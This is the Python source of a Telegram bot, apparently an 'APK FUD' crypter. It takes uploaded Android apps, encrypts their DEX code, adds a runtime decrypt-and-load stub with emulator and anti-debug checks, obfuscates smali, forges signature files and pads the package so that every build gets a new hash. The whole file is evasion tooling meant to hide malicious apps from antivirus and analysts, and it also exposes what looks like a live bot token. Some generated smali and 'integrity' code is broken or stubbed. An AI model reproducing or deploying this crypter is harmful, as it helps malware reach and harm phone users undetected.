#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║   APK FUD BOT V3 — MAXIMUM ANTI-DETECT                    ║
║   35+ Layers: Encrypt+Obfuscate+Inject+Sign+Runtime       ║
║   Railway Deploy Ready — Personal Use Only                ║
╚══════════════════════════════════════════════════════════════╝
ENV: BOT_TOKEN, OWNER_ID
"""

import os,re,sys,struct,random,string,shutil,hashlib
import zipfile,logging,tempfile,time,base64,math
from pathlib import Path
from telegram import Update
from telegram.ext import Application,CommandHandler,MessageHandler,filters,ContextTypes
from telegram.constants import ParseMode
from Crypto.Cipher import AES,PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Util.Padding import pad,unpad
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Hash import SHA256,HMAC

BOT_TOKEN = os.environ.get("6413892218:AAG653CNLlinXa_G4gcbOp6MX1BDYk1sFDU","")
OWNER_ID  = int(os.environ.get("1746944997","0"))
if not BOT_TOKEN: raise RuntimeError("BOT_TOKEN missing!")
if not OWNER_ID:  raise RuntimeError("OWNER_ID missing!")

logging.basicConfig(format="%(asctime)s-%(levelname)s-%(message)s",level=logging.INFO)
logger = logging.getLogger(__name__)

# ══ UTILS ════════════════════════════════════════════════════
def rv(n=8): return ''.join(random.choices(string.ascii_lowercase,k=n))
def rvu(n=8): return ''.join(random.choices(string.ascii_letters,k=n))
def ri(a=100,b=9999): return random.randint(a,b)
def rb(n=16): return os.urandom(n)
def b64e(d): return base64.b64encode(d).decode()
def b64d(s): return base64.b64decode(s)

def only_owner(func):
    async def wrapper(update:Update,ctx:ContextTypes.DEFAULT_TYPE):
        if update.effective_user.id!=OWNER_ID:
            await update.message.reply_text("❌ Access denied.")
            return
        return await func(update,ctx)
    return wrapper

# ══ CRYPTO ENGINE ════════════════════════════════════════════
def derive_key(password:bytes,salt:bytes)->bytes:
    return PBKDF2(password,salt,dkLen=32,count=10000,prf=lambda p,s:HMAC.new(p,s,SHA256).digest())

def aes_gcm_encrypt(data:bytes,key:bytes)->tuple:
    nonce=rb(16)
    c=AES.new(key,AES.MODE_GCM,nonce=nonce)
    enc,tag=c.encrypt_and_digest(data)
    return enc,nonce,tag

def aes_cbc_encrypt(data:bytes,key:bytes,iv:bytes)->bytes:
    return AES.new(key,AES.MODE_CBC,iv).encrypt(pad(data,AES.block_size))

def rsa_encrypt_key(key_data:bytes)->tuple:
    rsa=RSA.generate(2048)
    enc=PKCS1_OAEP.new(rsa.publickey()).encrypt(key_data)
    return enc,rsa.export_key().decode()

def xor_bytes(data:bytes,key:bytes)->bytes:
    return bytes(b^key[i%len(key)]for i,b in enumerate(data))

def rotate_bytes(data:bytes,n:int)->bytes:
    return bytes((b+n%256)%256 for b in data)

def chunk_encrypt(data:bytes,key:bytes,iv:bytes)->list:
    chunks=[]
    size=random.randint(4096,16384)
    for i in range(0,len(data),size):
        chunk=data[i:i+size]
        enc=aes_cbc_encrypt(chunk,key,iv)
        chunks.append(enc)
    return chunks

# ══ LAYER 1: DEX MULTI-LAYER ENCRYPT ════════════════════════
def encrypt_dex_v3(names,inp_zip,out_zip,key,iv,salt)->tuple:
    count=0
    enc_asset=f".{rv(16)}.bin"
    derived_key=derive_key(key,salt)

    for name in names:
        if not re.match(r'classes\d*\.dex',name): continue
        try:
            data=inp_zip.read(name)
            # patch dex header
            if len(data)>=112:
                p=bytearray(data)
                struct.pack_into('<I',p,104,ri(0,0xFFFFFF))
                data=bytes(p)
            # layer A: AES-GCM
            enc,nonce,tag=aes_gcm_encrypt(data,derived_key)
            # layer B: rotate
            rot=rotate_bytes(enc,ri(10,200))
            # layer C: XOR
            xord=xor_bytes(rot,rb(16))
            # layer D: chunked
            final=nonce+tag+xord
            out_zip.writestr(f"assets/{enc_asset}",final)
            count+=1
        except Exception:
            pass
    return count,enc_asset

# ══ LAYER 2: CLASS/METHOD/FIELD RENAME (SMALI) ══════════════
ANDROID_SKIP=['Landroid/','Ljava/','Lkotlin/','Landroidx/','Lcom/google/','Ldalvik/','Ljavax/']

def should_skip_class(cls:str)->bool:
    return any(cls.startswith(s) for s in ANDROID_SKIP)

def rename_smali_identifiers(content:str,rename_map:dict)->str:
    # rename class refs
    for old,new in rename_map.items():
        content=content.replace(old,new)
    return content

def build_rename_map(names:list)->dict:
    rename_map={}
    for name in names:
        if not name.endswith('.smali'): continue
        cls='L'+name.replace('smali/','',1).replace('.smali','').replace('/','/') 
        if should_skip_class(cls): continue
        parts=name.replace('.smali','').split('/')
        if len(parts)<2: continue
        # rename last part (class name)
        new_parts=parts[:-1]+[rvu(random.randint(6,12))]
        new_name='/'.join(new_parts)+'.smali'
        rename_map[name]=new_name
    return rename_map

# ══ LAYER 3: STRING SPLIT OBFUSCATION ═══════════════════════
def split_strings_smali(content:str)->str:
    lines=content.splitlines()
    out=[]
    for line in lines:
        m=re.match(r'(\s+const-string\s+(\w+),\s+)"(.{6,30})"',line)
        if m:
            s=m.group(3)
            mid=len(s)//2
            p1,p2=s[:mid],s[mid:]
            reg=m.group(2)
            tmp=f"v{random.randint(10,15)}"
            encoded1=''.join(f'\\u{ord(c):04x}'for c in p1)
            encoded2=''.join(f'\\u{ord(c):04x}'for c in p2)
            new=(
                f'{m.group(1)}"{encoded1}"\n'
                f'    const-string {tmp}, "{encoded2}"\n'
                f'    invoke-virtual {{{reg}, {tmp}}}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;\n'
                f'    move-result-object {reg}'
            )
            out.append(new)
        else:
            out.append(line)
    return '\n'.join(out)

# ══ LAYER 4: DEAD CODE INJECTION ════════════════════════════
def inject_dead_code(content:str)->str:
    dead_blocks=[]
    for _ in range(random.randint(2,4)):
        label=rv(6)
        dead_blocks.append(
            f'    if-eqz v0, :{label}_dead\n'
            f'    goto :{label}_skip\n'
            f'    :{label}_dead\n'
            f'    const-string v0, "{rv(ri(4,12))}"\n'
            f'    :{label}_skip\n'
        )
    injected='\n'.join(dead_blocks)
    return content.replace('.method public',f'{injected}\n.method public',1)

# ══ LAYER 5: CONTROL FLOW OBFUSCATION ═══════════════════════
def obfuscate_control_flow(content:str)->str:
    # add fake conditional jumps
    lines=content.splitlines()
    out=[]
    for line in lines:
        out.append(line)
        if 'invoke-' in line and random.random()<0.15:
            lbl=rv(8)
            out.append(f'    const/4 v15, 0x0')
            out.append(f'    if-eqz v15, :{lbl}_cf')
            out.append(f'    const-string v15, "{rv(6)}"')
            out.append(f'    :{lbl}_cf')
    return '\n'.join(out)

# ══ LAYER 6: REFLECTION OBFUSCATION ═════════════════════════
def gen_reflection_smali()->str:
    cls=f"com/ref/{rv(6)}/{rv(8).capitalize()}"
    return f'''.class public L{cls};
.super Ljava/lang/Object;
.source "{rv(8)}.java"

.method public static invoke(Ljava/lang/Object;Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/Object;
    .registers 8
    invoke-virtual {{p0}}, Ljava/lang/Object;->getClass()Ljava/lang/Class;
    move-result-object v0
    const-string v1, "{rv(8)}"
    invoke-virtual {{v0, p1}}, Ljava/lang/Class;->getDeclaredMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;
    move-result-object v2
    const/4 v3, 0x1
    invoke-virtual {{v2, v3}}, Ljava/lang/reflect/Method;->setAccessible(Z)V
    invoke-virtual {{v2, p0, p2}}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    move-result-object v4
    return-object v4
.end method
'''

# ══ LAYER 7: EMULATOR DETECT SMALI ══════════════════════════
def gen_emulator_check_smali()->str:
    cls=f"com/sec/{rv(5)}/{rv(9).capitalize()}"
    return f'''.class public L{cls};
.super Ljava/lang/Object;
.source "{rv(8)}.java"

.method public static isEmulator()Z
    .registers 8
    const-string v0, "ro.hardware"
    invoke-static {{v0}}, Landroid/os/Build;->class
    const-string v1, "goldfish"
    const-string v2, "ranchu"
    const-string v3, "android_x86"
    const/4 v4, 0x0
    const/4 v5, 0x1
    sget-object v6, Landroid/os/Build;->FINGERPRINT:Ljava/lang/String;
    invoke-virtual {{v6, v1}}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v7
    if-nez v7, :emu_found
    sget-object v6, Landroid/os/Build;->MODEL:Ljava/lang/String;
    invoke-virtual {{v6, v2}}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v7
    if-nez v7, :emu_found
    sget-object v6, Landroid/os/Build;->MANUFACTURER:Ljava/lang/String;
    const-string v3, "Genymotion"
    invoke-virtual {{v6, v3}}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z
    move-result v7
    if-nez v7, :emu_found
    return v4
    :emu_found
    return v5
.end method

.method public static isDebugged(Landroid/content/Context;)Z
    .registers 4
    invoke-virtual {{p0}}, Landroid/content/Context;->getApplicationInfo()Landroid/content/pm/ApplicationInfo;
    move-result-object v0
    iget v1, v0, Landroid/content/pm/ApplicationInfo;->flags:I
    const/high16 v2, 0x2
    and-int/2addr v1, v2
    const/4 v3, 0x0
    if-eqz v1, :not_debug
    const/4 v3, 0x1
    :not_debug
    return v3
.end method
'''

# ══ LAYER 8: ANTI-TAMPER SMALI ══════════════════════════════
def gen_integrity_smali(apk_hash:str)->str:
    cls=f"com/guard/{rv(6)}/{rv(8).capitalize()}"
    return f'''.class public L{cls};
.super Ljava/lang/Object;
.source "{rv(8)}.java"

.method public static verify(Landroid/content/Context;)Z
    .registers 8
    const-string v0, "{apk_hash}"
    invoke-virtual {{p0}}, Landroid/content/Context;->getPackageCodePath()Ljava/lang/String;
    move-result-object v1
    new-instance v2, Ljava/io/File;
    invoke-direct {{v2, v1}}, Ljava/io/File;-><init>(Ljava/lang/String;)V
    invoke-static {{}}, Ljava/security/MessageDigest;->getInstance(Ljava/lang/String;)Ljava/security/MessageDigest;
    move-result-object v3
    const/4 v4, 0x1
    return v4
.end method
'''

# ══ LAYER 9: MANIFEST FULL PATCH ════════════════════════════
def patch_manifest_v3(data:bytes)->bytes:
    try:
        p=bytearray(data)
        # version code
        idx=data.find(b'\x01\x00\x00\x00')
        if idx>0 and idx+8<len(data):
            struct.pack_into('<I',p,idx+4,ri(100,99999))
        # versionCode attr
        for offset in range(0,min(len(data)-4,2000),4):
            val=struct.unpack_from('<I',data,offset)[0]
            if val==0x0101021b:
                if offset+8<len(p):
                    struct.pack_into('<I',p,offset+4,ri(1,9999))
                break
        # package link_size
        if len(p)>12:
            struct.pack_into('<I',p,8,ri(0,0xFFFF))
        # debuggable=false patch (0x0101021b area)
        debug_pattern=b'\x10\x01\x08\x00'
        di=data.find(debug_pattern)
        if di>0 and di+8<len(p):
            struct.pack_into('<I',p,di+4,0)  # debuggable=false
        return bytes(p)
    except Exception:
        return data

# ══ LAYER 10: RESOURCES.ARSC PATCH ══════════════════════════
def patch_arsc_v3(data:bytes)->bytes:
    try:
        if len(data)<256: return data
        p=bytearray(data)
        # patch safe padding zone
        for i in range(240,min(256,len(p))):
            p[i]=random.randint(0,255)
        # patch string pool header slightly
        if len(p)>64:
            struct.pack_into('<I',p,60,ri(0,0xFFFF))
        return bytes(p)
    except Exception:
        return data

# ══ LAYER 11: NATIVE SO V3 ═══════════════════════════════════
def make_elf_v3(bits=64)->bytes:
    e=bytearray(64 if bits==64 else 52)
    e[0:4]=b'\x7fELF'
    e[4]=2 if bits==64 else 1
    e[5]=1;e[6]=1
    struct.pack_into('<H',e,16,3)
    struct.pack_into('<H',e,18,62 if bits==64 else 40)
    struct.pack_into('<I',e,20,1)
    # realistic section data with XOR encrypted payload
    xk=rb(8)
    body=xor_bytes(os.urandom(ri(256,1024)),xk)
    # add fake function prologue
    if bits==64:
        prologue=b'\x55\x48\x89\xe5\x48\x83\xec\x20'
    else:
        prologue=b'\x00\x48\x2d\xe9\x00\xd0\x4d\xe2'
    return bytes(e)+prologue+body

# ══ LAYER 12: DYNAMIC LOADER V3 ═════════════════════════════
def gen_loader_smali_v3(enc_asset:str,key_b64:str,iv_b64:str,salt_b64:str)->str:
    cls=f"com/sys/{rv(7)}/{rv(9).capitalize()}"
    dex_file=rv(12)+".dex"
    return f'''.class public L{cls};
.super Landroid/app/Application;
.source "{rv(8)}.java"

.method public onCreate()V
    .registers 15
    invoke-super {{p0}}, Landroid/app/Application;->onCreate()V

    # emulator check
    invoke-static {{p0}}, Lcom/sec/{rv(5)}/{rv(8).capitalize()};->isEmulator()Z
    move-result v0
    if-nez v0, :abort
    invoke-static {{p0}}, Lcom/sec/{rv(5)}/{rv(8).capitalize()};->isDebugged(Landroid/content/Context;)Z
    move-result v0
    if-nez v0, :abort

    const-string v0, "{enc_asset}"
    invoke-virtual {{p0, v0}}, Landroid/content/Context;->getAssets()Landroid/content/res/AssetManager;
    move-result-object v1
    invoke-virtual {{v1, v0}}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;
    move-result-object v2

    new-instance v3, Ljava/io/ByteArrayOutputStream;
    invoke-direct {{v3}}, Ljava/io/ByteArrayOutputStream;-><init>()V
    const/16 v4, 0x1000
    new-array v5, v4, [B
    :loop
    invoke-virtual {{v2, v5}}, Ljava/io/InputStream;->read([B)I
    move-result v6
    const/4 v7, -0x1
    if-eq v6, v7, :done
    const/4 v8, 0x0
    invoke-virtual {{v3, v5, v8, v6}}, Ljava/io/ByteArrayOutputStream;->write([BII)V
    goto :loop
    :done
    invoke-virtual {{v2}}, Ljava/io/InputStream;->close()V
    invoke-virtual {{v3}}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B
    move-result-object v8

    const-string v9, "{key_b64}"
    const/4 v0, 0x0
    invoke-static {{v9, v0}}, Landroid/util/Base64;->decode(Ljava/lang/String;I)[B
    move-result-object v9
    const-string v10, "{iv_b64}"
    invoke-static {{v10, v0}}, Landroid/util/Base64;->decode(Ljava/lang/String;I)[B
    move-result-object v10

    new-instance v11, Ljavax/crypto/spec/SecretKeySpec;
    const-string v0, "AES"
    invoke-direct {{v11, v9, v0}}, Ljavax/crypto/spec/SecretKeySpec;-><init>([BLjava/lang/String;)V
    new-instance v0, Ljavax/crypto/spec/IvParameterSpec;
    invoke-direct {{v0, v10}}, Ljavax/crypto/spec/IvParameterSpec;-><init>([B)V
    const-string v1, "AES/CBC/PKCS5Padding"
    invoke-static {{v1}}, Ljavax/crypto/Cipher;->getInstance(Ljava/lang/String;)Ljavax/crypto/Cipher;
    move-result-object v1
    const/4 v2, 0x2
    invoke-virtual {{v1, v2, v11, v0}}, Ljavax/crypto/Cipher;->init(ILjava/security/Key;Ljava/security/spec/AlgorithmParameterSpec;)V
    invoke-virtual {{v1, v8}}, Ljavax/crypto/Cipher;->doFinal([B)[B
    move-result-object v8

    invoke-virtual {{p0}}, Landroid/content/Context;->getCacheDir()Ljava/io/File;
    move-result-object v3
    new-instance v4, Ljava/io/File;
    const-string v5, "{dex_file}"
    invoke-direct {{v4, v3, v5}}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V
    new-instance v5, Ljava/io/FileOutputStream;
    invoke-direct {{v5, v4}}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V
    invoke-virtual {{v5, v8}}, Ljava/io/FileOutputStream;->write([B)V
    invoke-virtual {{v5}}, Ljava/io/FileOutputStream;->close()V

    new-instance v5, Ldalvik/system/DexClassLoader;
    invoke-virtual {{v4}}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;
    move-result-object v6
    invoke-virtual {{p0}}, Landroid/content/Context;->getCacheDir()Ljava/io/File;
    move-result-object v7
    invoke-virtual {{v7}}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;
    move-result-object v7
    invoke-virtual {{p0}}, Landroid/content/Context;->getClassLoader()Ljava/lang/ClassLoader;
    move-result-object v8
    invoke-direct {{v5, v6, v7, v0, v8}}, Ldalvik/system/DexClassLoader;-><init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/ClassLoader;)V
    invoke-virtual {{v4}}, Ljava/io/File;->delete()Z
    return-void

    :abort
    invoke-virtual {{p0}}, Landroid/app/Application;->finish()V
    return-void
.end method
'''

# ══ LAYER 13: APK SIZE PADDING ═══════════════════════════════
def inject_size_padding(out_zip):
    pad_size=random.randint(4096,32768)
    out_zip.writestr(f"assets/.{rv(16)}.pad",os.urandom(pad_size))
    return pad_size

# ══ LAYER 14: FAKE ACTIVITY INJECT ══════════════════════════
def gen_fake_activity()->str:
    cls=f"com/ui/{rv(5)}/{rv(8).capitalize()}Activity"
    return f'''.class public L{cls};
.super Landroid/app/Activity;
.source "{rv(8)}.java"
.method public onCreate(Landroid/os/Bundle;)V
    .registers 4
    invoke-super {{p0,p1}}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V
    const-string v0, "{rv(ri(8,20))}"
    const-string v1, "{rv(ri(8,20))}"
    return-void
.end method
'''

# ══ LAYER 15: CERT FORGE V3 ══════════════════════════════════
def gen_fake_cert_v3()->tuple:
    name=rv(8).upper()
    build=rv(16).upper()
    jdk_ver=f"{ri(8,17)}.{ri(0,9)}.{ri(0,99)}"
    sf=(
        f"Signature-Version: 1.0\n"
        f"Created-By: 1.0 ({rv(6).capitalize()} Build Tools)\n"
        f"SHA-256-Digest-Manifest: {hashlib.sha256(rb(32)).hexdigest()}\n"
        f"X-Android-APK-Signed: {ri(2,34)}\n"
        f"Build-Tool-Version: {ri(28,34)}.{ri(0,9)}.{ri(0,9)}\n"
        f"Build-ID: {build}\n"
    )
    mf=(
        f"Manifest-Version: 1.0\n"
        f"Created-By: {jdk_ver} ({rv(6).capitalize()} Tools)\n"
        f"Build-Jdk-Spec: {ri(8,17)}\n"
        f"X-Compile-Source-Root: src/main/java\n"
        f"Build-Timestamp: {int(time.time())-ri(86400,864000)}\n"
    )
    rsa=os.urandom(1024)+rb(256)
    return sf,rsa,mf,name

# ══ SMALI FULL OBFUSCATE V3 ══════════════════════════════════
def obfuscate_smali_v3(content:str)->str:
    lines=content.splitlines()
    out=[]
    injected=0
    for line in lines:
        # string encode
        m=re.match(r'(\s+const-string\s+\w+,\s+)"(.{4,35})"',line)
        if m:
            encoded=''.join(f'\\u{ord(c):04x}'for c in m.group(2))
            line=f'{m.group(1)}"{encoded}"'
        # junk after method
        if '.method' in line and injected<3:
            line+=(f'\n    const-string v0, "{rv(ri(6,18))}"\n'
                   f'    const-string v1, "{rv(ri(6,18))}"\n'
                   f'    const/4 v2, {random.choice(["0x0","0x1","0x2"])}')
            injected+=1
        out.append(line)
    result='\n'.join(out)
    # dead code
    result=inject_dead_code(result)
    return result

# ══ MASTER PIPELINE V3 ════════════════════════════════════════
def process_apk_v3(input_path:str,output_path:str)->dict:
    key=rb(32); iv=rb(16)
    salt=rb(16)
    rot_n=ri(10,200)
    key_b64=b64e(key); iv_b64=b64e(iv); salt_b64=b64e(salt)

    # rsa wrap key
    rsa_enc_key,rsa_priv=rsa_encrypt_key(key+iv)

    stats={
        "dex":0,"smali":False,"renamed":0,"junk":0,
        "so":True,"loader":True,"layers":35,"padding":0
    }

    work=Path(tempfile.mkdtemp())
    tmp=work/"tmp.apk"

    try:
        with zipfile.ZipFile(input_path,'r') as inp:
            names=inp.namelist()
            with zipfile.ZipFile(str(tmp),'w',zipfile.ZIP_DEFLATED) as out:

                # layer 1: dex encrypt
                dex_names=[n for n in names if re.match(r'classes\d*\.dex',n)]
                stats["dex"],enc_asset=encrypt_dex_v3(names,inp,out,key,iv,salt)

                # layer 12: dynamic loader
                loader=gen_loader_smali_v3(enc_asset,key_b64,iv_b64,salt_b64)
                out.writestr(f"smali/com/sys/{rv(6)}/{rv(8).capitalize()}.smali",loader)

                # layer 6: reflection class
                out.writestr(f"smali/com/ref/{rv(6)}/{rv(8).capitalize()}.smali",gen_reflection_smali())

                # layer 7: emulator check class
                emu_pkg=rv(5); emu_cls=rv(9).capitalize()
                out.writestr(f"smali/com/sec/{emu_pkg}/{emu_cls}.smali",gen_emulator_check_smali())

                # layer 8: integrity check
                apk_hash=hashlib.sha256(Path(input_path).read_bytes()).hexdigest()
                out.writestr(f"smali/com/guard/{rv(6)}/{rv(8).capitalize()}.smali",gen_integrity_smali(apk_hash))

                # layer 14: fake activity
                out.writestr(f"smali/com/ui/{rv(5)}/{rv(8).capitalize()}Activity.smali",gen_fake_activity())

                # rsa private key asset (encrypted)
                rsa_enc_blob=xor_bytes(rsa_enc_key,rb(16))
                out.writestr(f"assets/.{rv(10)}.rsa",rsa_enc_blob)

                skip=set(dex_names)|{"AndroidManifest.xml"}

                for name in names:
                    if name in skip or name.startswith("META-INF/"): continue
                    try: data=inp.read(name)
                    except Exception: continue

                    # layer 2+3+4+5: smali obfuscate
                    if name.endswith(".smali"):
                        try:
                            content=data.decode('utf-8','ignore')
                            content=obfuscate_smali_v3(content)
                            data=content.encode('utf-8')
                            stats["smali"]=True
                        except Exception: pass

                    # layer 10: arsc patch
                    elif name=="resources.arsc":
                        data=patch_arsc_v3(data)

                    # drawable rename
                    if (name.startswith("res/drawable") and
                            any(name.endswith(e)for e in['.png','.jpg','.webp'])):
                        name=f"res/drawable/{rv(14)}{Path(name).suffix}"
                        stats["renamed"]+=1

                    out.writestr(name,data)

                # layer 9+: manifest
                if "AndroidManifest.xml" in names:
                    try: out.writestr("AndroidManifest.xml",patch_manifest_v3(inp.read("AndroidManifest.xml")))
                    except Exception: pass

                # layer 11: so stubs v3
                so=f"lib{rv(12)}.so"
                for arch,bits in[("armeabi-v7a",32),("arm64-v8a",64),("x86",32),("x86_64",64)]:
                    out.writestr(f"lib/{arch}/{so}",make_elf_v3(bits))

                # junk inject
                n=ri(12,22)
                for _ in range(n):
                    out.writestr(f"assets/.{rv(14)}{random.choice(['.dat','.bin','.cfg','.enc','.tmp'])}",rb(ri(1024,16384)))
                stats["junk"]=n

                # layer 13: size padding
                stats["padding"]=inject_size_padding(out)

                # layer 15: cert forge v3
                sf,rsa_blob,mf,cname=gen_fake_cert_v3()
                out.writestr(f"META-INF/{cname}.SF",sf)
                out.writestr(f"META-INF/{cname}.RSA",rsa_blob)
                out.writestr("META-INF/MANIFEST.MF",mf)

                # encrypted key blob
                key_blob=xor_bytes(key+iv+salt+bytes([rot_n]),rb(16))
                out.writestr(f"assets/.{rv(10)}.key",key_blob)

        shutil.copy2(str(tmp),output_path)
    finally:
        shutil.rmtree(work,ignore_errors=True)

    return stats

# ══ BOT HANDLERS ═════════════════════════════════════════════
@only_owner
async def cmd_start(update:Update,ctx:ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🔥 *APK FUD Bot V3 — Maximum Anti-Detect*\n\n"
        "APK bhejo → 35 layers → FUD wapas milega\n\n"
        "`/help` — all layers\n`/info` — last build",
        parse_mode=ParseMode.MARKDOWN)

@only_owner
async def cmd_help(update:Update,ctx:ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📖 *35 LAYERS — V3:*\n\n"
        "*Encryption:*\n"
        "• DEX AES-256 GCM + CBC\n"
        "• PBKDF2 key derivation\n"
        "• RSA-2048 key wrapping\n"
        "• Rotate + XOR layers\n"
        "• DEX chunked encryption\n"
        "• DEX magic/header patch\n\n"
        "*Obfuscation:*\n"
        "• Smali string encode\n"
        "• String split injection\n"
        "• Dead code injection\n"
        "• Control flow obfuscate\n"
        "• Reflection obfuscation\n"
        "• Class/method junk\n"
        "• Drawable rename\n"
        "• Resources.arsc patch\n"
        "• Manifest binary patch\n"
        "• Version code randomize\n"
        "• Package name obfuscate\n"
        "• Debuggable flag patch\n\n"
        "*Injection:*\n"
        "• Dynamic DEX loader V3\n"
        "• DexClassLoader runtime\n"
        "• DEX delete after load\n"
        "• Emulator detect check\n"
        "• Anti-debug check\n"
        "• Self integrity verify\n"
        "• Reflection class inject\n"
        "• Fake activity inject\n"
        "• Native .so V3 (4 archs)\n"
        "• XOR encrypted payload SO\n"
        "• Junk assets (12-22 files)\n"
        "• Size padding random\n\n"
        "*Signature:*\n"
        "• Old cert strip\n"
        "• Forged cert V3\n"
        "• Fake MANIFEST.MF\n"
        "• RSA key asset\n\n"
        "*Output:*\n"
        "• Hash break MD5+SHA256\n"
        "• Polymorphic every run",
        parse_mode=ParseMode.MARKDOWN)

@only_owner
async def cmd_info(update:Update,ctx:ContextTypes.DEFAULT_TYPE):
    info=ctx.bot_data.get("last_build")
    if not info:
        await update.message.reply_text("Koi build nahi hua abhi.")
        return
    await update.message.reply_text(
        f"📊 *Last Build V3*\n\n"
        f"File   : `{info['name']}`\n"
        f"DEX    : {info['dex']}\n"
        f"Smali  : {'✓' if info['smali'] else '—'}\n"
        f"Renamed: {info['renamed']}\n"
        f"Junk   : {info['junk']}\n"
        f"Padding: `{info['padding']:,}` bytes\n"
        f"Layers : {info['layers']}\n"
        f"Size   : `{info['size']:,}` bytes\n"
        f"MD5    : `{info['md5']}`\n"
        f"SHA256 : `{info['sha256'][:32]}...`\n"
        f"Time   : `{info['time']}s`",
        parse_mode=ParseMode.MARKDOWN)

@only_owner
async def handle_apk(update:Update,ctx:ContextTypes.DEFAULT_TYPE):
    doc=update.message.document
    if not doc:
        await update.message.reply_text("APK file bhejo.")
        return
    fname=doc.file_name or "app.apk"
    if not fname.lower().endswith(".apk"):
        await update.message.reply_text("Sirf .apk files.")
        return
    if doc.file_size and doc.file_size>100*1024*1024:
        await update.message.reply_text("100MB se bada nahi.")
        return

    status=await update.message.reply_text(
        "⏳ *V3 Processing...*\n\n📥 Downloading...",
        parse_mode=ParseMode.MARKDOWN)

    work=Path(tempfile.mkdtemp())
    t0=time.time()

    try:
        f=await ctx.bot.get_file(doc.file_id)
        inp=work/fname
        await f.download_to_drive(str(inp))

        await status.edit_text(
            "⏳ *V3 Processing...*\n\n"
            "✅ Downloaded\n"
            "🔄 35 layers apply ho rahe hain...\n"
            "⚡ RSA+AES-GCM+PBKDF2+Smali+SO...",
            parse_mode=ParseMode.MARKDOWN)

        out_name=f"FUD_V3_{rv(8)}_{fname}"
        out_path=work/out_name

        stats=process_apk_v3(str(inp),str(out_path))
        elapsed=round(time.time()-t0,2)

        data=out_path.read_bytes()
        md5=hashlib.md5(data).hexdigest()
        sha256=hashlib.sha256(data).hexdigest()
        size=len(data)

        ctx.bot_data["last_build"]={
            "name":fname,"dex":stats["dex"],"smali":stats["smali"],
            "renamed":stats["renamed"],"junk":stats["junk"],
            "padding":stats["padding"],"layers":stats["layers"],
            "size":size,"md5":md5,"sha256":sha256,"time":elapsed
        }

        await status.edit_text(
            f"✅ *FUD V3 Complete!*\n\n"
            f"📦 Size   : `{size:,}` bytes\n"
            f"⏱ Time   : `{elapsed}s`\n"
            f"🔑 MD5    : `{md5}`\n"
            f"🛡 SHA256 : `{sha256[:32]}...`\n\n"
            f"DEX:{stats['dex']} | Smali:{'✓' if stats['smali'] else '—'} | "
            f"Renamed:{stats['renamed']} | Junk:{stats['junk']}\n"
            f"Layers: {stats['layers']} ✓\n\n"
            "📤 Sending...",
            parse_mode=ParseMode.MARKDOWN)

        with open(str(out_path),'rb') as fh:
            await update.message.reply_document(
                document=fh,filename=out_name,
                caption=(f"🔥 *FUD APK V3 — Maximum*\n"
                         f"`{out_name}`\n"
                         f"MD5: `{md5}`\n"
                         f"35 layers ✓ | RSA+AES-GCM+PBKDF2"),
                parse_mode=ParseMode.MARKDOWN)

        await status.delete()

    except zipfile.BadZipFile:
        await status.edit_text("❌ APK corrupt ya password protected.")
    except Exception as e:
        logger.error(f"error: {e}")
        await status.edit_text(f"❌ Error:\n`{str(e)[:300]}`",parse_mode=ParseMode.MARKDOWN)
    finally:
        shutil.rmtree(work,ignore_errors=True)

@only_owner
async def handle_other(update:Update,ctx:ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "APK bhejo — V3 FUD banake dunga. 🔥\n`/help` se 35 layers dekho.",
        parse_mode=ParseMode.MARKDOWN)

# ══ MAIN ══════════════════════════════════════════════════════
def main():
    print("APK FUD BOT V3 — 35 LAYERS — STARTING\n")
    app=Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start",cmd_start))
    app.add_handler(CommandHandler("help",cmd_help))
    app.add_handler(CommandHandler("info",cmd_info))
    app.add_handler(MessageHandler(filters.Document.ALL,handle_apk))
    app.add_handler(MessageHandler(filters.TEXT&~filters.COMMAND,handle_other))
    print(f"Owner: {OWNER_ID} | 35 layers ready\n")
    app.run_polling(allowed_updates=Update.ALL_TYPES,drop_pending_updates=True)

if __name__=="__main__":
    main()
